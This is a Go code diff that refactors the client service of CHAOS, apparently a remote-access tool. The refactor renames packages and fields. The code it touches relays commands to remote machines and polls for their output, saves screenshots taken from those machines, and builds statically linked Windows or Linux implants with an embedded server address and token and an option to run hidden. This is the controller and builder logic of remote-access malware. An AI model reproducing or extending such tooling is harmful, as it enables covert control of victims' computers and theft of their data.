@@ -1,4 +1,4 @@
-package services
+package client
 
 import (
 	"context"
@@ -9,31 +9,32 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/utils/image"
 	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
-	repo "github.com/tiagorlampert/CHAOS/repositories"
+	"github.com/tiagorlampert/CHAOS/repositories"
+	"github.com/tiagorlampert/CHAOS/services/auth"
+	"github.com/tiagorlampert/CHAOS/services/payload"
 	"os/exec"
 	"strings"
 	"time"
 )
 
-const secretKeySize = 50
-
 type clientService struct {
-	appVersion     string
-	repository     repo.Auth
-	payloadService Payload
-	authService    Auth
+	AppVersion     string
+	Repository     repositories.Auth
+	PayloadService payload.Service
+	AuthService    auth.Service
 }
 
 func NewClient(
 	appVersion string,
-	repository repo.Auth,
-	payloadCache Payload,
-	authService Auth) Client {
+	repository repositories.Auth,
+	payloadCache payload.Service,
+	authService auth.Service,
+) Service {
 	return &clientService{
-		repository:     repository,
-		payloadService: payloadCache,
-		appVersion:     appVersion,
-		authService:    authService,
+		Repository:     repository,
+		PayloadService: payloadCache,
+		AppVersion:     appVersion,
+		AuthService:    authService,
 	}
 }
 
@@ -43,25 +44,25 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
 	}
 
-	c.payloadService.Set(addr, &PayloadData{
+	c.PayloadService.Set(addr, &payload.Data{
 		Request: input.Request,
 	})
-	defer c.payloadService.Remove(addr)
+	defer c.PayloadService.Remove(addr)
 
-	var payload *PayloadData
+	var payloadData *payload.Data
 	var done bool
 	for !done {
 		time.Sleep(2 * time.Second)
-		res, _ := c.payloadService.Get(addr)
+		res, _ := c.PayloadService.Get(addr)
 		res.Request = input.Request
 		if res.HasResponse {
-			payload, _ = HandleResponse(res)
+			payloadData, _ = HandleResponse(res)
 			done = true
 		}
 	}
 
-	res := utils.ByteToString(payload.Response)
-	if payload.HasError {
+	res := utils.ByteToString(payloadData.Response)
+	if payloadData.HasError {
 		return SendCommandOutput{}, fmt.Errorf(res)
 	}
 	if len(strings.TrimSpace(res)) == 0 {
@@ -70,7 +71,7 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 	return SendCommandOutput{Response: res}, nil
 }
 
-func HandleResponse(payload *PayloadData) (*PayloadData, error) {
+func HandleResponse(payload *payload.Data) (*payload.Data, error) {
 	switch payload.Request {
 	case "screenshot":
 		file, err := image.WritePNG(payload.Response)
@@ -106,8 +107,10 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	}
 
 	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
+
 	filename = handleFilename(input.OSTarget, filename)
-	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.appVersion, input.ServerPort, input.ServerAddress, token, filename)
+	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, token, filename)
+
 	cmd := exec.Command("sh", "-c", buildCmd)
 	cmd.Dir = "client/"
 
@@ -119,7 +122,7 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 }
 
 func (c clientService) GenerateNewToken() (string, error) {
-	auth, err := c.authService.First()
+	auth, err := c.AuthService.First()
 	if err != nil {
 		return "", err
 	}
@@ -132,8 +135,6 @@ func handleOSType(osType system.OSType) string {
 		return "windows"
 	case system.Linux:
 		return "linux"
-	//case 3:
-	//	return "darwin"
 	default:
 		return "unknown"
 	}
